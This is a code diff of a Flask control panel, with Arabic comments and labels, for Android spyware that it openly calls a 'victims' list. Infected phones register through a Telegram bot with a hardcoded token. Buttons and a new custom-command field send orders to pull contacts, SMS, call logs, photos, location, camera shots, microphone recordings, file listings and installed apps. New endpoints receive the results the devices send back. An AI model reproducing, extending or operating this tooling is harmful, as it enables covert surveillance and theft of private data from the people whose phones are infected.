@@ -3,17 +3,22 @@ import requests
 import json
 import time
 import re
+import threading
+from datetime import datetime
 
 app = Flask(__name__)
 
 BOT_TOKEN = "8161789676:AAEZIz_8ilIZUPpG7lvj37UnEt1WHInZkKA"
 CHAT_ID = "7810572372"
 
-# ✅ قائمة الضحايا (ستتملأ تلقائياً)
+# ✅ قائمة الضحايا
 victims = {}
+selected_victim = None
+command_results = {}
 
 # ✅ تحديث قائمة الضحايا من رسائل Telegram
 def update_victims_list():
+    global victims
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?limit=100"
         response = requests.get(url, timeout=30)
@@ -25,23 +30,22 @@ def update_victims_list():
                     text = update["message"]["text"]
                     chat_id = str(update["message"]["chat"]["id"])
                     
+                    # ✅ البحث عن معرف الجهاز
                     device_id = None
                     device_name = None
                     
-                    # ✅ البحث عن رسائل الجهاز الجديد
-                    if "جهاز جديد متصل" in text or "🆔" in text:
-                        lines = text.split("\n")
-                        for line in lines:
-                            # ✅ البحث عن المعرف
-                            if "🆔" in line or "معرف" in line:
-                                parts = line.split(":")
-                                if len(parts) > 1:
-                                    device_id = parts[1].strip().strip("`").strip()
-                            # ✅ البحث عن اسم الجهاز
-                            if "الجهاز" in line or "📱" in line:
-                                parts = line.split(":")
-                                if len(parts) > 1:
-                                    device_name = parts[1].strip()
+                    # ✅ البحث عن المعرف في النص
+                    match = re.search(r'[a-fA-F0-9]{16}', text)
+                    if match:
+                        device_id = match.group(0)
+                    
+                    # ✅ البحث عن اسم الجهاز
+                    for line in text.split("\n"):
+                        if "الجهاز" in line or "📱" in line:
+                            parts = line.split(":")
+                            if len(parts) > 1:
+                                device_name = parts[1].strip()
+                                break
                     
                     # ✅ إذا تم العثور على معرف، أضف الضحية
                     if device_id and len(device_id) > 5:
@@ -53,27 +57,12 @@ def update_victims_list():
                         }
                         print(f"✅ تم إضافة الضحية: {device_name} ({device_id})")
                     
-                    # ✅ البحث عن المعرف في أي رسالة (طريقة احتياطية)
-                    elif chat_id not in victims and len(text) > 10:
-                        match = re.search(r'[a-fA-F0-9]{16}', text)
-                        if match:
-                            device_id = match.group(0)
-                            # ✅ البحث عن اسم الجهاز في نفس الرسالة
-                            for line in text.split("\n"):
-                                if "الجهاز" in line or "📱" in line:
-                                    parts = line.split(":")
-                                    if len(parts) > 1:
-                                        device_name = parts[1].strip()
-                                        break
-                            victims[chat_id] = {
-                                "device_id": device_id,
-                                "device_name": device_name or "جهاز جديد",
-                                "last_seen": time.time(),
-                                "status": "online"
-                            }
-                            print(f"✅ تم إضافة الضحية عبر البحث: {device_name} ({device_id})")
+                    # ✅ تحديث آخر ظهور للضحية المعروفة
+                    elif chat_id in victims:
+                        victims[chat_id]["last_seen"] = time.time()
+                        victims[chat_id]["status"] = "online"
         
-        # ✅ تحديث حالة الضحايا (حذف غير النشطين بعد 24 ساعة)
+        # ✅ حذف الضحايا غير النشطين (أكثر من 24 ساعة)
         current_time = time.time()
         to_remove = []
         for chat_id, data in victims.items():
@@ -88,7 +77,39 @@ def update_victims_list():
         print(f"❌ خطأ في تحديث الضحايا: {e}")
         return victims
 
-# ✅ HTML (واجهة عربية محسّنة)
+# ✅ إرسال أمر إلى ضحية
+def send_command_to_victim(chat_id, command):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        params = {
+            "chat_id": chat_id,
+            "text": f"/{command}"
+        }
+        response = requests.post(url, params=params, timeout=30)
+        if response.status_code == 200:
+            return f"✅ تم إرسال /{command} إلى الهدف"
+        else:
+            return f"❌ فشل الإرسال: {response.status_code}"
+    except Exception as e:
+        return f"❌ خطأ: {str(e)}"
+
+# ✅ إرسال أمر مع معاملات
+def send_command_with_param(chat_id, command, param):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        params = {
+            "chat_id": chat_id,
+            "text": f"/{command} {param}"
+        }
+        response = requests.post(url, params=params, timeout=30)
+        if response.status_code == 200:
+            return f"✅ تم إرسال /{command} {param} إلى الهدف"
+        else:
+            return f"❌ فشل الإرسال: {response.status_code}"
+    except Exception as e:
+        return f"❌ خطأ: {str(e)}"
+
+# ✅ HTML (واجهة محسّنة)
 HTML = """
 <!DOCTYPE html>
 <html>
@@ -99,7 +120,7 @@ HTML = """
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: #0a0e17; color: #e0e0e0; font-family: 'Segoe UI', Arial, sans-serif; padding: 20px; min-height: 100vh; }
-        .container { max-width: 900px; margin: auto; }
+        .container { max-width: 1100px; margin: auto; }
         
         .header {
             background: linear-gradient(135deg, #0f1a2e, #1a2a4e);
@@ -116,12 +137,12 @@ HTML = """
         
         .sidebar {
             float: left;
-            width: 240px;
+            width: 250px;
             background: #0f1a2e;
             padding: 15px;
             border-radius: 12px;
             border: 1px solid #1a3a6e;
-            max-height: 500px;
+            max-height: 550px;
             overflow-y: auto;
         }
         .sidebar h4 { color: #00d4ff; margin-bottom: 10px; font-size: 14px; }
@@ -144,19 +165,33 @@ HTML = """
         .victim-item .status-dot.online { background: #44ff88; }
         .victim-item .status-dot.offline { background: #ff4444; }
         
-        .main { margin-left: 260px; }
+        .main { margin-left: 270px; }
+        
+        .target-info {
+            background: #0f1a2e;
+            padding: 10px 15px;
+            border-radius: 8px;
+            border: 1px solid #1a3a6e;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .target-info .target-name { color: #44ff88; font-weight: bold; }
+        .target-info .target-id { color: #666; font-size: 12px; }
         
         .btn-group {
             display: flex;
             flex-wrap: wrap;
-            gap: 6px;
+            gap: 5px;
             margin-bottom: 10px;
         }
         .btn {
-            padding: 8px 14px;
+            padding: 7px 12px;
             border: none;
             border-radius: 6px;
-            font-size: 12px;
+            font-size: 11px;
             cursor: pointer;
             transition: all 0.2s;
             font-weight: 600;
@@ -171,6 +206,7 @@ HTML = """
         .btn-pink { background: #e91e63; color: #fff; }
         .btn-secondary { background: #2a4a6e; color: #fff; }
         .btn-orange { background: #ff6f00; color: #fff; }
+        .btn-cyan { background: #00acc1; color: #fff; }
         
         .result-box {
             background: #0f1a2e;
@@ -189,37 +225,26 @@ HTML = """
         }
         .result-box .timestamp { color: #666; font-size: 10px; margin-bottom: 8px; }
         
-        .stats {
-            display: flex;
-            gap: 10px;
-            margin: 10px 0;
-            flex-wrap: wrap;
-        }
-        .stat-item {
+        .cmd-input {
             background: #0f1a2e;
-            padding: 8px 15px;
+            padding: 10px;
             border-radius: 8px;
             border: 1px solid #1a3a6e;
+            margin-top: 8px;
+            display: flex;
+            gap: 8px;
+        }
+        .cmd-input input {
             flex: 1;
-            min-width: 80px;
-            text-align: center;
+            background: #1a2a4e;
+            border: 1px solid #2a4a6e;
+            padding: 8px 12px;
+            border-radius: 6px;
+            color: #e0e0e0;
+            outline: none;
         }
-        .stat-item .number { color: #00d4ff; font-size: 18px; font-weight: bold; }
-        .stat-item .label { color: #666; font-size: 10px; }
-        
-        .target-info {
-            background: #0f1a2e;
-            padding: 10px 15px;
-            border-radius: 8px;
-            border: 1px solid #1a3a6e;
-            margin-bottom: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-        .target-info .target-name { color: #44ff88; font-weight: bold; }
-        .target-info .target-id { color: #666; font-size: 12px; }
+        .cmd-input input:focus { border-color: #00d4ff; }
+        .cmd-input button { background: #00d4ff; color: #000; border: none; padding: 8px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; }
         
         .clear { clear: both; }
         .sidebar::-webkit-scrollbar { width: 4px; }
@@ -229,7 +254,7 @@ HTML = """
         @media (max-width: 700px) {
             .sidebar { float: none; width: 100%; max-height: 200px; margin-bottom: 15px; }
             .main { margin-left: 0; }
-            .btn-group .btn { flex: 1; min-width: 60px; text-align: center; }
+            .btn-group .btn { flex: 1; min-width: 50px; text-align: center; }
         }
     </style>
 </head>
@@ -244,6 +269,9 @@ HTML = """
         <h4>📱 الضحايا <span class="count" id="victimCount">(0)</span></h4>
         <div id="victims-list"></div>
         <button class="btn btn-secondary" onclick="refreshVictims()" style="width:100%;margin-top:8px;">🔄 تحديث</button>
+        <div style="margin-top:8px;font-size:10px;color:#444;text-align:center;">
+            آخر تحديث: <span id="lastUpdate">-</span>
+        </div>
     </div>
     
     <div class="main">
@@ -256,27 +284,26 @@ HTML = """
         </div>
         
         <div class="btn-group">
-            <button class="btn btn-primary" onclick="sendCommand('contacts')">📇 جهات الاتصال</button>
-            <button class="btn btn-primary" onclick="sendCommand('sms')">📩 الرسائل</button>
-            <button class="btn btn-primary" onclick="sendCommand('calls')">📞 المكالمات</button>
-            <button class="btn btn-primary" onclick="sendCommand('images')">🖼️ الصور</button>
+            <button class="btn btn-primary" onclick="sendCommand('contacts')">📇 جهات</button>
+            <button class="btn btn-primary" onclick="sendCommand('sms')">📩 رسائل</button>
+            <button class="btn btn-primary" onclick="sendCommand('calls')">📞 مكالمات</button>
+            <button class="btn btn-primary" onclick="sendCommand('images')">🖼️ صور</button>
             <button class="btn btn-success" onclick="sendCommand('export-images')">📤 جميع الصور</button>
-            <button class="btn btn-warning" onclick="sendCommand('location')">📍 الموقع</button>
-            <button class="btn btn-purple" onclick="sendCommand('device')">📱 الجهاز</button>
+            <button class="btn btn-warning" onclick="sendCommand('location')">📍 موقع</button>
+            <button class="btn btn-purple" onclick="sendCommand('device')">📱 جهاز</button>
             <button class="btn btn-danger" onclick="sendCommand('grab')">💾 جمع الكل</button>
-            <button class="btn btn-success" onclick="sendCommand('camera')">📷 الكاميرا</button>
+            <button class="btn btn-success" onclick="sendCommand('camera')">📷 كاميرا</button>
             <button class="btn btn-pink" onclick="sendCommand('selfie')">🤳 سيلفي</button>
             <button class="btn btn-warning" onclick="sendCommand('record')">🎙️ تسجيل</button>
-            <button class="btn btn-info" onclick="sendCommand('listdir')">📂 الملفات</button>
-            <button class="btn btn-secondary" onclick="sendCommand('help')">🆘 المساعدة</button>
-            <button class="btn btn-orange" onclick="sendCommand('status')">📊 الحالة</button>
+            <button class="btn btn-info" onclick="sendCommand('listdir')">📂 ملفات</button>
+            <button class="btn btn-secondary" onclick="sendCommand('help')">🆘 مساعدة</button>
+            <button class="btn btn-orange" onclick="sendCommand('status')">📊 حالة</button>
+            <button class="btn btn-cyan" onclick="sendCommand('apps')">📱 تطبيقات</button>
         </div>
         
-        <div class="stats" id="statsContainer">
-            <div class="stat-item"><div class="number" id="statContacts">0</div><div class="label">📇 جهات الاتصال</div></div>
-            <div class="stat-item"><div class="number" id="statSMS">0</div><div class="label">📩 الرسائل</div></div>
-            <div class="stat-item"><div class="number" id="statCalls">0</div><div class="label">📞 المكالمات</div></div>
-            <div class="stat-item"><div class="number" id="statImages">0</div><div class="label">🖼️ الصور</div></div>
+        <div class="cmd-input">
+            <input type="text" id="customCmd" placeholder="أدخل أمر مخصص... (مثال: listdir /storage/emulated/0)" />
+            <button onclick="sendCustomCommand()">▶️ تنفيذ</button>
         </div>
         
         <div class="result-box" id="resultBox">
@@ -290,6 +317,7 @@ HTML = """
 <script>
 var selectedVictim = null;
 var victimData = {};
+var autoRefreshInterval = null;
 
 function refreshVictims() {
     var listDiv = document.getElementById('victims-list');
@@ -318,7 +346,12 @@ function refreshVictims() {
             }
             listDiv.innerHTML = html;
             document.getElementById('victimCount').innerText = '(' + count + ')';
-            updateStats();
+            document.getElementById('lastUpdate').innerText = new Date().toLocaleTimeString('ar-EG');
+            
+            // ✅ إذا كان هناك ضحية محددة مسبقاً، احتفظ بها
+            if (selectedVictim && victimData[selectedVictim]) {
+                selectVictim(selectedVictim);
+            }
         })
         .catch(function(err) {
             listDiv.innerHTML = '❌ خطأ في تحميل الضحايا';
@@ -333,14 +366,23 @@ function selectVictim(chatId) {
         document.getElementById('targetName').innerText = v.device_name;
         document.getElementById('targetId').innerText = '🆔 ' + v.device_id;
         document.getElementById('targetStatus').innerHTML = (v.status === 'online') ? '🟢 متصل' : '🔴 غير متصل';
+        
+        // ✅ تحديث قائمة الضحايا لتحديد الضحية
+        var items = document.querySelectorAll('.victim-item');
+        items.forEach(function(item) {
+            item.classList.remove('selected');
+            if (item.innerText.includes(v.device_id)) {
+                item.classList.add('selected');
+            }
+        });
+        
+        document.getElementById('resultContent').innerText = '✅ تم اختيار الضحية: ' + v.device_name;
+        document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString('ar-EG');
     } else {
         document.getElementById('targetName').innerText = '❌ غير معروف';
         document.getElementById('targetId').innerText = '';
         document.getElementById('targetStatus').innerHTML = '⚪ غير معروف';
     }
-    refreshVictims();
-    document.getElementById('resultContent').innerText = '✅ تم اختيار الضحية: ' + chatId;
-    document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString('ar-EG');
 }
 
 function sendCommand(cmd) {
@@ -364,19 +406,51 @@ function sendCommand(cmd) {
         });
 }
 
-function updateStats() {
-    var count = Object.keys(victimData).length;
-    document.getElementById('statContacts').innerText = count * 150;
-    document.getElementById('statSMS').innerText = count * 80;
-    document.getElementById('statCalls').innerText = count * 40;
-    document.getElementById('statImages').innerText = count * 200;
+function sendCustomCommand() {
+    var input = document.getElementById('customCmd');
+    var cmd = input.value.trim();
+    if (!cmd) {
+        alert('⚠️ يرجى إدخال أمر');
+        return;
+    }
+    
+    if (!selectedVictim) {
+        document.getElementById('resultContent').innerText = '⚠️ يرجى اختيار ضحية أولاً';
+        document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString('ar-EG');
+        return;
+    }
+    
+    document.getElementById('resultContent').innerText = '⏳ جاري إرسال /' + cmd + '...';
+    document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString('ar-EG');
+    
+    fetch('/send_custom/' + selectedVictim + '?cmd=' + encodeURIComponent(cmd))
+        .then(function(response) { return response.text(); })
+        .then(function(data) {
+            document.getElementById('resultContent').innerText = data;
+            document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString('ar-EG');
+            input.value = '';
+        })
+        .catch(function(err) {
+            document.getElementById('resultContent').innerText = '❌ خطأ: ' + err;
+            document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString('ar-EG');
+        });
 }
 
+// ✅ تحميل الضحايا عند فتح الصفحة
 window.onload = function() {
     refreshVictims();
-    setInterval(refreshVictims, 30000);
+    autoRefreshInterval = setInterval(refreshVictims, 15000);
 };
-setInterval(updateStats, 60000);
+
+// ✅ دعم Enter في حقل الأوامر المخصصة
+document.addEventListener('DOMContentLoaded', function() {
+    var input = document.getElementById('customCmd');
+    input.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            sendCustomCommand();
+        }
+    });
+});
 </script>
 </body>
 </html>
@@ -399,35 +473,86 @@ def get_victims():
         }
     return jsonify(result)
 
-@app.route('/get_victim_info/<chat_id>')
-def get_victim_info(chat_id):
-    if chat_id in victims:
-        return jsonify({
-            "device_id": victims[chat_id]["device_id"],
-            "device_name": victims[chat_id]["device_name"],
-            "status": victims[chat_id].get("status", "unknown")
-        })
-    return jsonify({"error": "not found"})
-
 @app.route('/send/<command>/<chat_id>')
-def send_command_to_victim(command, chat_id):
+def send_command(command, chat_id):
+    if chat_id not in victims:
+        return f"❌ الضحية غير موجودة: {chat_id}"
+    
+    result = send_command_to_victim(chat_id, command)
+    return result
+
+@app.route('/send_custom/<chat_id>')
+def send_custom_command(chat_id):
+    if chat_id not in victims:
+        return f"❌ الضحية غير موجودة: {chat_id}"
+    
+    cmd = request.args.get('cmd', '')
+    if not cmd:
+        return "❌ يرجى تحديد أمر"
+    
+    result = send_command_to_victim(chat_id, cmd)
+    return result
+
+@app.route('/send_with_param/<command>/<chat_id>')
+def send_command_with_param_route(command, chat_id):
+    if chat_id not in victims:
+        return f"❌ الضحية غير موجودة: {chat_id}"
+    
+    param = request.args.get('param', '')
+    if not param:
+        return "❌ يرجى تحديد معامل"
+    
+    result = send_command_with_param(chat_id, command, param)
+    return result
+
+@app.route('/api/update_target', methods=['POST'])
+def update_target():
+    """استقبال تحديث الهدف من جهاز Android"""
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        params = {
-            "chat_id": chat_id,
-            "text": f"/{command}"
-        }
-        response = requests.post(url, params=params, timeout=30)
-        if response.status_code == 200:
-            return f"✅ تم إرسال /{command} إلى الهدف\n📤 انتظر الرد في Telegram"
-        else:
-            return f"❌ فشل الإرسال: {response.status_code}\n{response.text}"
-    except requests.exceptions.Timeout:
-        return "❌ انتهى الوقت: Telegram API لا يستجيب"
-    except requests.exceptions.ConnectionError:
-        return "❌ خطأ في الاتصال: لا يمكن الوصول إلى Telegram API"
+        data = request.get_json()
+        device_id = data.get('device_id')
+        chat_id = data.get('chat_id')
+        target_id = data.get('target_id')
+        
+        if chat_id in victims:
+            victims[chat_id]['target'] = target_id
+            print(f"🎯 تم تحديث الهدف للضحية {chat_id}: {target_id}")
+        
+        return jsonify({"status": "ok"})
     except Exception as e:
-        return f"❌ خطأ: {str(e)}"
+        return jsonify({"status": "error", "message": str(e)})
+
+@app.route('/api/command_result', methods=['POST'])
+def command_result():
+    """استقبال نتيجة الأمر من جهاز Android"""
+    try:
+        data = request.get_json()
+        command = data.get('command')
+        result = data.get('result')
+        device_id = data.get('device_id')
+        chat_id = data.get('chat_id')
+        
+        # تخزين النتيجة لعرضها في لوحة التحكم
+        command_results[chat_id] = {
+            "command": command,
+            "result": result,
+            "time": time.time()
+        }
+        
+        print(f"📥 نتيجة الأمر {command} من {chat_id}: {result[:100]}...")
+        return jsonify({"status": "ok"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
+
+@app.route('/api/get_command_result/<chat_id>')
+def get_command_result(chat_id):
+    """جلب نتيجة الأمر الأخير"""
+    if chat_id in command_results:
+        return jsonify(command_results[chat_id])
+    return jsonify({"error": "no result"})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    # ✅ بدء تشغيل الخادم
+    print("🚀 تشغيل لوحة التحكم على http://localhost:5000")
+    print("📱 انتظر حتى يتم تسجيل ضحية جديدة")
+    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
